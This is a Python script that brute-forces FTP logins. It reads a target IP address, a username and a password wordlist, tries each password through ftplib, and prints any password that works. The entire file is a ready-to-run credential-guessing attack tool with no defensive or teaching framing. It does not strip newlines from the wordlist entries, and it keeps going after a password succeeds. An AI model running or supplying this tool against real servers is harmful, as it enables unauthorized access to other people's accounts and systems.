import ftplib
from colored import fg, bg, attr

color = fg('green')
reset = attr('reset')

try:
	file1 = open('ftpbrute.txt', 'r')
	print(' ')
	print (color + file1.read() + reset)
	file1.close()
except IOError:
	print('\nBanner File not found!')


gateway = input("Enter Target IP Address: ")
print("\n")
name = input("Enter Target Username: ")
print("\n")
wordlist = input("Enter wordlist filepath: ")
print("\n")

flag = 0

try:
    passfile = open(wordlist, "r")
except:
    print("No file found !\n")
    quit()

for passwd in passfile:

    try:
        ftp = ftplib.FTP(gateway, name, passwd)
        print("[+] {0:*^50}".format("Password found :D\n"))
        print("[+] Password is: {0}".format(passwd))
        print("[+]{0:*^50}".format(""))
        flag = 1

    except:
        print("[-] Password Trying...{0}".format(passwd))
	
print("\n")
if (flag == 0):
    print ("Password not found :(\n")
    print ("Please modify your wordlist !\n")
